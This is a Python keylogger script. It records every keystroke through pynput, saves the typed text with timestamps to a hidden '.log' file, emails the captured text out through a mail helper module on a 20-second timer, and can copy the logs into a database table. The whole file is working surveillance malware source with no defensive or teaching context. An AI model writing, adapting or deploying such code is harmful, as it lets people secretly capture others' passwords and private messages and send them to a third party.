import os
from pynput import keyboard
from datetime import datetime
import json
import mail_handler as md
from threading import Timer
import argparse
import db_handle as dh


parser = argparse.ArgumentParser()
parser.add_argument('--keylog', help='run keylogger.', action="store_true")
parser.add_argument('--to_db', help='read log file and log into the database.', action="store_true")
args = parser.parse_args()

# define the path of log file.
path = os.getcwd()
log_file = path + '/.log'

send = True
newTimer = False


def log_to_db():
    log = ""
    # read the log information into a list.
    with open(log_file, 'r') as f:
        log = f.read()
    log = log.split('\n')[:-1]
    for info in log:
        get_count = """
            SELECT count(*) FROM Keylogger
        """
        res = dh.SQLquery(get_count, ())
        query = """
            INSERT INTO Keylogger (ID, Log_info, log_time)
            VALUES (?, ?, ?)
        """
        info = json.loads(info)
        params = (res[0][0], info["msg"], info["time"])
        dh.SQLupdate(query, params)

def is_send():
    global send
    send = True


"""
Class that processes some basic functions of a keylogger.
"""
class Keylogger:
    def __init__(self):
        self.log_file = log_file
        self.log = ''

    """
    get keyboard event.
    """
    def get_key(self, key):
        try:
            getKey = str(key.char)
            print(getKey)
        except AttributeError:
            getKey = ''

        self.append_log(getKey)

    """
    once the 'enter' key is released, we log the previous message
    into the log file.
    And when a 'space is entered, we log it, too.
    """
    def get_Release (self, key):
        if key == keyboard.Key.enter:
            self.construct_data()
            return False
        elif key == keyboard.Key.space:
            self.log += ' '

    def append_log(self, newmsg):
        self.log += newmsg

    # construct data to be logged in a json format.
    def construct_data (self):
        # get current time.
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        data = {
            "msg": self.log,
            "time": current_time
        }
        data = json.dumps(data)
        # put the logged message into the log file.
        with open(self.log_file, 'a') as f:
            f.write(data)
            f.write('\n')
        # send email and clear temp log buffer.
        global send
        global newTimer
        if send:
            print('send')
            md.send_email(self.log)
            send = False
            newTimer = True
        self.log = ''

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.get_key, on_release=self.get_Release)
        with keyboard_listener:
            keyboard_listener.join()


if args.keylog:
    kl = Keylogger()
    while 1:
        kl.start()
        # if send is False and new timer is True, we set a new timer.
        if not send and newTimer:
            t = Timer(20.0, is_send)
            t.start()
            newTimer = False
elif args.to_db:
    log_to_db()
else:
    pass
